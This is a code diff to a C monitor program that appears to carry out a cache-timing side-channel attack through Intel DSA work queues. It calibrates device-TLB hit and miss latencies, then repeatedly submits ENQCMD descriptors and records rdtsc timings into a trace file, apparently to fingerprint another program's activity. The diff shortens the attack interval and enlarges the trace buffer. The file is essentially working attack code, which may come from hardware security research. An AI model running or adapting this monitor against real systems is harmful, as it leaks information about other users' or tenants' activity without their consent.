@@ -1,16 +1,13 @@
 #include "dsa.h"
-#include <signal.h>
 
 #define CALIBRATION_RUNS 10000
-#define ATTACK_INTERVAL_US 3000
+#define ATTACK_INTERVAL_US 10
 #define DIFF_THRESHOLD 300
-#define NOISE_THRESHOLD 2000 // cycles
 #define CALIBRATION_RETRIES 5
-#define TRACE_BUFFER_SIZE 20000
+#define TRACE_BUFFER_SIZE 100000
 
 #define UPDATE_THRESHOLD(hit, miss) ((hit * 34 + miss * 66) / 100)
 
-int keep_running = 1;
 uint64_t detection_threshold;
 struct wq_info wq_info;
 struct dsa_hw_desc desc = {};
@@ -20,27 +17,19 @@ struct dsa_completion_record comp __attribute__((aligned(32))) = {};
 uint64_t trace_buffer[TRACE_BUFFER_SIZE];
 int trace_index = 0;
 
-void handler(int dummy) {
-    keep_running = 0;
-    printf("[monitor] Stopping...\n");
-}
-
 static inline uint64_t probe_atc(struct dsa_completion_record* comp) {
-    uint64_t start, end;
+    uint64_t start;
     comp->status = 0;
     desc.completion_addr = (uintptr_t) comp;
     enqcmd(wq_info.wq_portal, &desc);
     start = rdtsc();
     while (comp->status == 0);
-    end = rdtsc();
-    return end - start;
+    return rdtsc() - start;
 }
 
 // Save traces to file
-void save_traces(char* taskname) {
-    char filename[256];
-    snprintf(filename, sizeof(filename), "wf-%s-traces.txt", taskname);
-
+void save_traces() {
+    char filename[256] = "wf-traces.txt";
     FILE* fp = fopen(filename, "w");
     if (!fp) {
         fprintf(stderr, "[monitor] Failed to open file\n");
@@ -55,17 +44,8 @@ void save_traces(char* taskname) {
 }
 
 int main(int argc, char *argv[]) {
-    char *taskname;
-    if (argc == 2) {
-        taskname = argv[1];
-        signal(SIGINT, handler);
-    } else {
-        printf("Usage: %s [prog-to-spy]\n", argv[0]);
-        return EXIT_FAILURE;
-    }
-    
     // Initialize work queue
-    int rc = map_spec_wq(&wq_info, "/dev/dsa/wq2.0");
+    int rc = map_spec_wq(&wq_info, "/dev/dsa/wq0.1");
     if (rc) {
         fprintf(stderr, "[monitor] Failed to map work queue: %d\n", rc);
         return EXIT_FAILURE;
@@ -113,16 +93,15 @@ calib:
     printf("\tDevTLB hit  latency: %lu cycles\n", avg_hit);
     printf("\tDetection threshold: %lu cycles\n", detection_threshold);
     
-    printf("[monitor] Spying on task: %s\n", taskname);
     uint64_t tmp = 0;
-    while (trace_index < TRACE_BUFFER_SIZE && keep_running) {
-        probe_atc(&comp);
+    while (trace_index < TRACE_BUFFER_SIZE) {
+        enqcmd(wq_info.wq_portal, &desc);
         usleep(ATTACK_INTERVAL_US);
         trace_buffer[trace_index++] = probe_atc(&comp);
-        usleep(10);
+        // usleep(1);
     }
     
-    save_traces(taskname);
+    save_traces();
 
     return EXIT_SUCCESS;
 }
